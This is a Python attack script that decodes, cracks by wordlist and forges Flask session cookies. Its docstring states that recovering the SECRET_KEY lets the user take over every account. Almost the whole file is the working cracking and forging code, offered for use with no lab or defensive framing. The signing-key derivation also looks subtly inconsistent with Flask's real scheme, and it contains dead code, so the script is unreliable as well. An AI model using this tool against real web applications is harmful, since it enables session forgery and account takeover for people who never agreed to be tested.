#!/usr/bin/env python3
"""
flask-cookie.py — decode / crack / forge Flask session cookies.

Flask signs session cookies with its SECRET_KEY. If you can crack the key you
own every account.

usage:
  flask-cookie.py decode  '<cookie>'
  flask-cookie.py crack   '<cookie>' <wordlist>
  flask-cookie.py forge   '<json>' '<secret>'

Prefer `flask-unsign` for anything serious — this is a dependency-free fallback.
"""
import base64, hashlib, hmac, hashlib as _h, json, sys, time, zlib


# --- itsdangerous-compatible timing-safe compare + signing ---
B64_ALT = b"-_"

def b64d(s: str) -> bytes:
    s = s.encode()
    s += b"=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _derive(secret: str, salt: bytes = b"cookie-session") -> bytes:
    return hmac.new(secret.encode(), salt + b"signer", hashlib.sha1).digest()


def _sign_payload(payload: str, secret: str) -> str:
    key = _derive(secret)
    sig = hmac.new(key, payload.encode(), hashlib.sha1).digest()
    return b64e(sig)


def decode(cookie: str):
    # format: payload[.timestamp].signature   (payload may start with '.' if compressed)
    parts = cookie.split(".")
    payload = parts[0]
    if payload.startswith(""):
        pass
    compressed = cookie.startswith(".")
    if compressed:
        payload = parts[1]; parts = parts[1:]
    raw = b64d(payload)
    if compressed:
        raw = zlib.decompress(raw)
    try:
        obj = json.loads(raw)
        print(json.dumps(obj, indent=2))
    except Exception:
        print(repr(raw))


def crack(cookie: str, wordlist: str):
    # last section is signature; everything before (joined with .) is signed payload
    *head, sig = cookie.split(".")
    payload = ".".join(head)
    with open(wordlist, "rb") as f:
        for raw in f:
            pw = raw.rstrip(b"\r\n").decode(errors="ignore")
            if _sign_payload(payload, pw) == sig:
                print(f"SECRET_KEY = {pw!r}")
                return
    print("not in wordlist")


def forge(payload_json: str, secret: str):
    obj = json.loads(payload_json)
    body = json.dumps(obj, separators=(",", ":"), sort_keys=True)
    b64 = b64e(body.encode())
    # include timestamp like itsdangerous.TimedSerializer does? Simple variant:
    ts = b64e(int(time.time()).to_bytes(4, "big").lstrip(b"\x00") or b"\x00")
    payload = f"{b64}.{ts}"
    sig = _sign_payload(payload, secret)
    print(f"{payload}.{sig}")


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    cmd = sys.argv[1]
    if cmd == "decode":
        decode(sys.argv[2])
    elif cmd == "crack":
        crack(sys.argv[2], sys.argv[3])
    elif cmd == "forge":
        forge(sys.argv[2], sys.argv[3])
    else:
        sys.exit(__doc__)


if __name__ == "__main__":
    main()
